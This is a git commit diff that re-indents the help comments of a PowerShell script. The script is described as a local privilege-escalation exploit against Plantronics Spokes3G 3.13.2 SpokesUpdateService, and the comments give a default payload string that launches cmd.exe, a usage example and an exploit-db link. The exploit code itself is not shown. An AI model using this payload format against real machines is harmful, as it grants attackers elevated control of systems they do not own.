0aa2ec73d7d38a7ecefbd307eedb0521108cd97a
Benjamin Heater <benheater@gmail.com>
2022-08-31 15:36:44 -0400

    Update Get-Spokes3GSystem.ps1

--- Get-Spokes3GSystem.ps1
+++ Get-Spokes3GSystem.ps1
@@ -1,37 +1,37 @@
 <#
-        .SYNOPSIS
-        Automates the local privilege escalation against Plantronics 3.13.2 SpokesUpdateService
+.SYNOPSIS
+Automates the local privilege escalation against Plantronics 3.13.2 SpokesUpdateService
 
-        .DESCRIPTION
-        Tested on Microsoft Windows Server 2019.
-        This script can be run as-is or with user-supplied inputs.
+.DESCRIPTION
+Tested on Microsoft Windows Server 2019.
+This script can be run as-is or with user-supplied inputs.
 
-        .PARAMETER Spokes3GDirectory
-        This is the base Spokes3G directory.
-        Defaults to C:\ProgramData\Plantronics\Spokes3G
+.PARAMETER Spokes3GDirectory
+This is the base Spokes3G directory.
+Defaults to C:\ProgramData\Plantronics\Spokes3G
 
-        .PARAMETER TargetFile
-        This is the target upgrade file.
-        Defaults to MajorUpgrade.config
+.PARAMETER TargetFile
+This is the target upgrade file.
+Defaults to MajorUpgrade.config
 
-        .PARAMETER Payload
-        This is the command execution string.
-        Defaults to "$($env:USERNAME)|advertise|C:\Windows\System32\cmd.exe"
+.PARAMETER Payload
+This is the command execution string.
+Defaults to "$($env:USERNAME)|advertise|C:\Windows\System32\cmd.exe"
 
-        .INPUTS
-        None. You cannot pipe objects to Add-Extension.
+.INPUTS
+None. You cannot pipe objects to Add-Extension.
 
-        .OUTPUTS
-        None.
+.OUTPUTS
+None.
 
-        .EXAMPLE
-        PS> .\Get-Spokes3GSystem.ps1
+.EXAMPLE
+PS> .\Get-Spokes3GSystem.ps1
 
-        .EXAMPLE
-        PS> .\Get-Spokes3GSystem.ps1 -Spokes3GDirectory 'C:\Path\To\Spokes3G' -FileName 'FileName.config' -Payload "username|advertise|C:\Windows\Temp\payload.exe"
+.EXAMPLE
+PS> .\Get-Spokes3GSystem.ps1 -Spokes3GDirectory 'C:\Path\To\Spokes3G' -FileName 'FileName.config' -Payload "username|advertise|C:\Windows\Temp\payload.exe"
 
-        .LINK
-        https://www.exploit-db.com/exploits/47845
+.LINK
+https://www.exploit-db.com/exploits/47845
 #>
 [CmdletBinding()]
 param (
